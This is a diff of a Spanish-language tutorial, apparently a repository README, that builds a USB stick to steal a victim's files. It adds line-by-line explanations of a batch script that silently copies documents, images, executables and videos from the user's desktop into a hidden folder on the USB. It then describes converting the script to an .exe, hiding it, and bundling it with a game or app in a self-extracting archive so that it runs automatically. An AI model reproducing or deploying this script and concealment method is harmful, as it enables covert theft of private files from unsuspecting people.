@@ -4,11 +4,25 @@ Vamos a realizar una USB que robe lo datos de cualquier usuario para ello vamos 
 para que se copie los archivo de la victima y luego se creara una carpeta oculta dentro de la USB donde guardara todo esos archivos.
 
 El script que vamos a utilizar es 
+
 @shift /0 --->  Sirve para acceder a parametros que esten despues de la novena posición y támbien puede mostrar parametros que pueden o no pueden estar presente
-@echo off ---> 
-IF NOT EXIST ".\Datos" MD ".\Datos" ---> 
-cd .\Datos --->
-for /R C:Users\Admin\Desktop %%x in (*.pdf *.pptx *.jpg *.jpeg *.png *.bmp *.exe *.mp4) do copy "%%x" ".\" ---> 
 
+@echo off --->  Desactiva el volcado de texto
 
-exit? ---> 
+IF NOT EXIST ".\Datos" MD ".\Datos" ---> En este caso comprueba si existe la carpeta Datos. Si no existe crear el directorio.
+
+cd .\Datos --->  Entramos en el directorio Datos
+
+for /R C:Users\Admin\Desktop %%x in (*.pdf *.pptx *.jpg *.jpeg *.png *.bmp *.exe *.mp4) do copy "%%x" ".\" ---> Es un bucle que busca los archivos que conencidan 
+con la ruta y las extensiones que hemos indicado. Luego se copia todos los archivos encontrados en la carpeta Datos.
+
+exit? ---> Para salir del script.
+
+Pasos para ocultar el script
+Ahora vamos guardarlo con el nombre de datos.bat y luego utilizando un conversor cambiaremos la extension a .exe (lo pondremos oculto)
+Necesitamos buscar una aplicación o un juego en el cual esconderemos el script. Una vez que tenemos el archivo para poder descargar 
+los pondremos en la USB. Selecionamos datos.exe y el programar de descargar a la vez para crear un archivo autoextraíble 
+en el que se ejecutar automaticamente la aplicacion datos.exe.
+
+Por ultimo tendremos que activar la opción carpetas y archivos ocultos para entrar en la carpeta datos y ver todos los archivos que se han guardado. 
+
